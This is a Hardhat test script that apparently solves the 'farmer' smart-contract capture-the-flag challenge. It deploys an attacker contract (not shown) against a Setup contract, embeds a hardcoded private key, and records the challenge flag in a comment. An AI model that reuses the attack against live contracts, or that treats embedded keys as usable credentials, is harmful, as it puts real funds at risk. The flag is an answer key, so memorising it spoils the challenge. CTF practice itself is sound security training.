import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { deployOrGetAt, getEoaOrPrivateKey } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let eoaAddress: string;
let attacker: Contract;
let setup: Contract; // setup contract
let tx: any;

before(async () => {
  eoa = await getEoaOrPrivateKey(
    `0xa3191e29dbd73c676d1feae2649272fa39068ebfa1994504235fcd9aad9a78a6`
  );
  eoaAddress = await eoa.getAddress();

  setup = await deployOrGetAt(
    `contracts/farmer/public/contracts/Setup.sol:Setup`,
    `0x03DE7d9E43Be8Eb0fb539cD310996e3645cC9dfb`,
    eoa,
    { value: ethers.utils.parseEther(`100`) }
  );
});

it("solves the challenge", async function () {
  const attackerFactory = await ethers.getContractFactory(`FarmerAttacker`, eoa);
  attacker = await attackerFactory.deploy(setup.address);

  tx = await attacker.attack({ value: ethers.utils.parseEther(`5`)})
  await tx.wait()

  // PCTF{PR0T3CT_Y0UR_H4RV3ST}
});
